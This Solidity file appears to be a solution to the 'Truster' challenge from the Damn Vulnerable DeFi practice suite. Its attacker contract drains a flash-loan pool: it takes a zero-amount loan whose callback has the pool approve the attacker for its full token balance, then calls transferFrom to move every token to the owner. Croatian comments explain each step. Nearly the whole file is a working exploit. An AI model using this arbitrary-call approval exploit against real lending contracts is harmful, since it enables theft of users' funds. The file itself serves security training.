// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ILenderPool {
    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data) external;
}

contract AttackerApproveTokensContract{

    address private owner;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
        owner=msg.sender;
    }

    function drainPoolFunds(address poolAddress,uint256 poolBalance) external
    {
        require(msg.sender==owner,"Only owner can call this function");
        //buduci da je potrebno da msg.sender kod approvanja bude adresa CONTRCTA OD POOLA -> MORAMO JE POZVAT IZ LENDER POOL ACCOUNTA -> ŠALJEMO token contrat kao target a approve funkciju s argumentima preko calldata parametra
        //-> ZA SPENDERA CEMO STAVIT NAŠ CONTRACT A ZA AMMOUNT CIJELI CONTRACT
        ILenderPool(poolAddress).flashLoan(0,address(this),address(damnValuableToken),abi.encodeWithSignature("approve(address,uint256)",address(this),poolBalance));
        //budici da je potrebno da bude zadovoljen balanceAfter>=blanceBefore ne smimo posudit nista kako bi flashLoan funkcija usojesno prosla
        //U OVOM TRENUTKU -> IMAMO APPROVANO TROSENJE SVIH TOKENA IZ POOLA
        //prebacimo sve na racun ownera/napadaca
        //MSG.SENDER CE BIT ADRESA OVOG CONTRACTA, NJOJ JE DOPUSTENO TRANSFERIRAT
        damnValuableToken.transferFrom(poolAddress, owner, poolBalance);
    }

}